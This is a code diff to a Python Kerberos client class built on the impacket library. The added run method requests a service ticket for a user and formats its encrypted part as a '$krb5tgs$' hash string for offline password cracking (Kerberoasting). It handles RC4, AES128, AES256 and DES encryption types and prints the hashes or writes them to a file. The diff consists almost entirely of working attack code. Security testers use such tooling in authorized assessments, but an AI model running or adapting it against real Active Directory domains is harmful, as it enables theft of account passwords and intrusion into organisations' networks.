@@ -1,6 +1,6 @@
 import logging
 import sys
-from binascii import unhexlify
+from binascii import unhexlify, hexlify
 from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
 from impacket.krb5 import constants
 from impacket.krb5.types import Principal
@@ -52,13 +52,59 @@ class TGS:
 
 
 
-    def run(self):
+    def run(self, fd=None):
+        """change fd to save to file, will return entry if there is one"""
+        spn = self.domain + '/' + self.username
         formatted_name = self.domain + "\\" + self.username
         userclient = Principal()
         userclient.type = constants.PrincipalNameType.NT_MS_PRINCIPAL.value
         userclient.components = formatted_name
+        entry = None
         tgs, cipher, old, key = getKerberosTGS(userclient, self.domain, self.dc, self.tgt, self.cipher, self.new)
         if self.preauth == False:
             decodes = decoder.decode(tgs, asn1Spec=AS_REP())[0]
         else:
             decodes = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
+
+        if decodes['ticket']['enc-part']['etype'] == constants.EncryptionTypes.rc4_hmac.value:
+            entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
+                constants.EncryptionTypes.rc4_hmac.value, self.username, decodes['ticket']['realm'],
+                spn.replace(':', '~'),
+                hexlify(decodes['ticket']['enc-part']['cipher'][:16].asOctets()).decode(),
+                hexlify(decodes['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
+            if fd is None:
+                print(entry)
+            else:
+                fd.write(entry + '\n')
+        elif decodes['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value:
+            entry = '$krb5tgs$%d$%s$%s$*%s*$%s$%s' % (
+                constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value, self.username, decodes['ticket']['realm'],
+                spn.replace(':', '~'),
+                hexlify(decodes['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(),
+                hexlify(decodes['ticket']['enc-part']['cipher'][:-12:].asOctets()).decode())
+            if fd is None:
+                print(entry)
+            else:
+                fd.write(entry + '\n')
+        elif decodes['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:
+            entry = '$krb5tgs$%d$%s$%s$*%s*$%s$%s' % (
+                constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value, self.username, decodes['ticket']['realm'],
+                spn.replace(':', '~'),
+                hexlify(decodes['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(),
+                hexlify(decodes['ticket']['enc-part']['cipher'][:-12:].asOctets()).decode())
+            if fd is None:
+                print(entry)
+            else:
+                fd.write(entry + '\n')
+        elif decodes['ticket']['enc-part']['etype'] == constants.EncryptionTypes.des_cbc_md5.value:
+            entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
+                constants.EncryptionTypes.des_cbc_md5.value, self.username, decodes['ticket']['realm'],
+                spn.replace(':', '~'),
+                hexlify(decodes['ticket']['enc-part']['cipher'][:16].asOctets()).decode(),
+                hexlify(decodes['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
+            if fd is None:
+                print(entry)
+            else:
+                fd.write(entry + '\n')
+        return entry
+
